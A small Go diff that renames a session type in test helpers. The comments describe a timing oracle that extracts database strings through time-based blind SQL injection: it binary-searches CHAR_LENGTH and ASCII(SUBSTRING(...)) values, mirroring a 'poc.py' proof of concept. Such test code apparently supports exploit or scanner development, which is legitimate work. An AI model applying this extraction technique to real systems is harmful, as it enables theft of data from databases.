@@ -78,7 +78,7 @@ func binarySearchGE(oracle func(threshold int) bool, lo, hi int) int {
 // timingMirror() config, and report whether a delay came back. This is the
 // same call the HTTP strategy makes (modulo the actual time.Sleep, which
 // lives at that call site, not here).
-func mirrorDelayOracle(t *testing.T, sess *chainSession, condFmt func(threshold int) string) func(threshold int) bool {
+func mirrorDelayOracle(t *testing.T, sess *ChainSession, condFmt func(threshold int) string) func(threshold int) bool {
 	t.Helper()
 	m := timingMirror() // shipped IfRegex/BareRegex config, reused verbatim
 	return func(threshold int) bool {
@@ -92,7 +92,7 @@ func mirrorDelayOracle(t *testing.T, sess *chainSession, condFmt func(threshold 
 // oracle: binary-search CHAR_LENGTH(...) >= N for the length, then
 // binary-search ASCII(SUBSTRING(...,pos,1)) >= M for each byte in turn. This
 // mirrors poc.py's getscalar() length-then-bytes strategy.
-func recoverStringViaTiming(t *testing.T, sess *chainSession, subquery string, maxLen int) string {
+func recoverStringViaTiming(t *testing.T, sess *ChainSession, subquery string, maxLen int) string {
 	t.Helper()
 
 	lenOracle := mirrorDelayOracle(t, sess, func(threshold int) string {
